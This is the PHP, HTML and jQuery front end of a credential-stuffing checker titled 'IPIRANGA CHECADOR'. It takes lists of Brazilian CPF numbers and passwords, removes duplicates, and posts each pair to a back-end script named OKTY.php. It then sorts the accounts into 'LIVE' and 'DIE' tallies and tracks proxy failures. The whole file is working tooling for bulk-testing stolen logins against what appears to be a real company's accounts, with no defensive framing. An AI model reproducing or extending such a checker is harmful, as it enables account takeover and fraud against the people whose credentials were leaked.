<?php 
include '../../dbc.php';
page_protect();


?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta name="description" content="IPIRANGA CHECADOR" />
	<meta name="author" content="IPIRANGA CHECADOR" />
	<title>TECHNOLOGY CHECKER IPIRANGA CHECADOR</title>
	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
    <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.9.1/jquery-ui.min.js"></script>
	<style>
			body
		{
			background-color: #FFD777;
			font-size: 9pt;
			font-family:Verdana;
			line-height:12pt;
			color: #FFFFFF;
		}
			body,td,th {
			color: #FFFFFF;
		}
		h2
		{
			color: #FFFFFF;
		}
		h1 {
			padding: 10px 15px;
			color: red;
		}

		.main-content {
				width: 70%; height: 380px;margin: auto; background: #FFFFFF;      border-radius: 5px 5px 5px 5px; box-shadow: 0 0 3px rgba(0, 0, 0, 0.5); min-height: 380px;      position: relative;
		}
		textarea, input {
				border-radius: 5px 5px 5px 5px;
		}
		input {
				height: 14px;width: 30px;text-align: center;o
		}
			
			
		.button {
			   
		}
		.submit-button
				{
						background: #FFD777;
						border:solid 1px #FFD777;
						border-radius:5px;
								-moz-border-radius: 5px;
								-webkit-border-radius: 5px;
						-moz-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
						-webkit-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
						text-shadow: 0 -1px 1px rgba(0,0,0,0.25);
						border-bottom: 1px solid rgba(0,0,0,0.25);
						position: relative;
						color:#FFF;
						display: inline-block;
						cursor:pointer;
						font-size:13px;
						padding:3px 8px;
						height: 30px;width: 120px;
				}
        .submit-button:hover {
        background:#82D051;border:solid 1px #86CC50;
        height: 30px;width: 120px;      }
 
		#show {
				width: 70%;margin: auto;padding: 10px 10px;
		}

		.business{
			font-weight:bold;
			color:yellow;
		}
		.premier{
			font-weight:bold;
			color:#00FF00;
		}
		.verified{
			font-weight:bold;
			color:#006DB0;
		}
		.fieldset{
			border: 1px dashed #FFFFFF;
			margin-top: 20px;
		}
		.tvmit_live{
			border: 1px dashed #FFFFFF;
			color:yellow;
			font-weight:bold;
		}
		.tvmit_die{
			border: 1px dashed #FFFFFF;
			color:red;
			font-weight:bold;
		}
		#result{
			display:none;
		}
	</style>
	
<script type="text/javascript">

		var ajaxCall;

		Array.prototype.remove = function(value){
			var index = this.indexOf(value);
			if(index != -1){
				this.splice(index, 1);
			}
			return this;
		};
		function enableTextArea(bool){
			$('#mailpass').attr('disabled', bool);
		}
		function tvmit_liveUp(){
			var count = parseInt($('#tvmit_live_count').html());
			count++;
			$('#tvmit_live_count').html(count+'');
		}
		function tvmit_dieUp(){
			var count = parseInt($('#tvmit_die_count').html());
			count++;
			$('#tvmit_die_count').html(count+'');
		}

		function PARARLoading(bool){
			$('#loading').attr('src', 'clear.gif');
			var str = $('#checkStatus').html();
			$('#checkStatus').html(str.replace('Checking','PARARped'));
			enableTextArea(false);
			$('#submit').attr('disabled', false);
			$('#PARAR').attr('disabled', true);
			if(bool){
				alert('Done');
			}else{
				ajaxCall.abort();
			}
			updateTitle('IPIRANGA CHECADOR');
		}
		function updateTitle(str){
			document.title = str;
		}
		function updateTextBox(mp){
			var mailpass = $('#mailpass').val().split("\n");
			mailpass.remove(mp);
			$('#mailpass').val(mailpass.join("\n"));
		}
		function OKTY(lstMP, curMP,  delim, cEmail, maxFail, failed){
			
			if(lstMP.length<1 ||curMP>=lstMP.length){
				PARARLoading(true);
				return false;
			}
			if(failed>=maxFail){
			
				OKTY(lstMP, curMP, delim, cEmail, maxFail, 0);
				return false;
			}
			updateTextBox(lstMP[curMP]);
			
			ajaxCall = $.ajax({
				url: 'OKTY.php',
				dataType: 'json',
				cache: false,
				type: 'POST',
				beforeSend: function (e) {
					updateTitle(lstMP[curMP] + ' - IPIRANGA CHECADOR');
					$('#checkStatus').html('Checking: ' + lstMP[curMP]).effect("highlight", {color:'#00ff00'}, 1000);
					$('#loading').attr('src', 'loading.gif');
				},
				data: 'ajax=1&do=check&mailpass='+encodeURIComponent(lstMP[curMP])
						+'&delim='+encodeURIComponent(delim)+'&email='+cEmail,
				success: function(data) {
					switch(data.error){
						case -1:
							curMP++;
							$('#wrong').append(data.msg+'<br />').effect("highlight", {color:'#ff0000'}, 1000);
							break;
						case 1:
						case 3:
							$('#badsock').append(data.msg+'<br />').effect("highlight", {color:'#ff0000'}, 1000);
							break;
						case 2:
							curMP++;
							$('#tvmit_die').append(data.msg+'<br />').effect("highlight", {color:'#ff0000'}, 1000);
							failed++;
							tvmit_dieUp();
							break;
						case 0:
							curMP++;
							$('#tvmit_live').append(data.msg+'<br />').effect("highlight", {color:'#00ff00'}, 1000);
							tvmit_liveUp();
							break;
					}
					OKTY(lstMP, curMP, delim, cEmail, maxFail, failed);
				}
			});
			return true;
		}
		function filterMP(mp, delim){
			var mps = mp.split("\n");
			var filtered = new Array();
			var lstMP = new Array();
			for(var i=0;i<mps.length;i++){
				if(mps[i].indexOf('')!=-1){
					var infoMP = mps[i].split(delim);
					for(var k=0;k<infoMP.length;k++){
						if(infoMP[k].indexOf('')!=-1){
							var email = $.trim(infoMP[k]);
							var pwd = $.trim(infoMP[k+1]);
							if(filtered.indexOf(email.toLowerCase())==-1){
								filtered.push(email.toLowerCase());
								lstMP.push(email+'|'+pwd);
								break;
							}
						}
					}
				}
			}
			return lstMP;
		}
		$(document).ready(function(){
			$('#PARAR').attr('disabled', true).click(function(){
			  PARARLoading(false);  
			});
			$('#submit').click(function(){
				var delim = $('#delim').val().trim();
				var mailpass = filterMP($('#mailpass').val(), delim);
				var bank = $('#bank').is(':checked') ? 1 : 0;
				var card = $('#card').is(':checked') ? 1 : 0;
				var infor = $('#info').is(':checked') ? 1 : 0;
				var cEmail = $('#email').is(':checked') ? 1 : 0;
				var maxFail = parseInt($('#fail').val());
				var failed = 0;
				if($('#mailpass').val().trim()==''){
					alert('No Mail/Pass found!');
					return false;
				}
			
				$('#mailpass').val(mailpass.join("\n")).attr('disabled', true);
				$('#result').show();
				$('#submit').attr('disabled', true);
				$('#PARAR').attr('disabled', false);
				OKTY(mailpass,  0, delim, cEmail, maxFail, 0);
				return false; 
			});
		});
</script>
</head>
<body>
<?php

$emailArea = <<< email
CPF|SENHA
email;

?>

<br /><br />
<div class="main-content">
 <section id="main" class=""><center><h1>IPIRANGA CHECADOR</h1>

 <?php
////$IP = file_get_contents('http://phihag.de/ip/');

//$externalContent = file_get_contents('http://checkip.dyndns.com/');
//preg_match('/Current IP Address: ([\[\]:.[0-9a-fA-F]+)</', $externalContent, $m);
//$IP = $m[1];

echo '<h2> TECHNOLOGY CHECKER '.$IP.'</h2>';
?> 
 
<form method="post">
	<div align="center">
		<textarea name="mailpass" id="mailpass" cols="80" rows="10"><?php

echo $emailArea;

?></textarea>
<br />
		<b>DELIMITADOR:</b> <input type="text" name="delim" id="delim" value="|" size="1" />
		<input type="button" class = "submit-button" value=" CHECAR " id="submit" />&nbsp;<input type="button" class = "submit-button" value=" PARAR " id="PARAR" /><br /><br />
        <img id="loading" src="clear.gif" /><br />
        <span id="checkStatus"></span>
	</div>
</form>
  </center></section>
</div>
<div id="result">
    <fieldset class="fieldset">
        <legend class="tvmit_live">LIVE: <span id="tvmit_live_count">0</span></legend>
        <div id="tvmit_live"></div>
    </fieldset>
    <fieldset class="fieldset">
        <legend class="tvmit_die">DIE: <span id="tvmit_die_count">0</span></legend>
        <div id="tvmit_die"></div>
    </fieldset>
</div>
</body>
</html>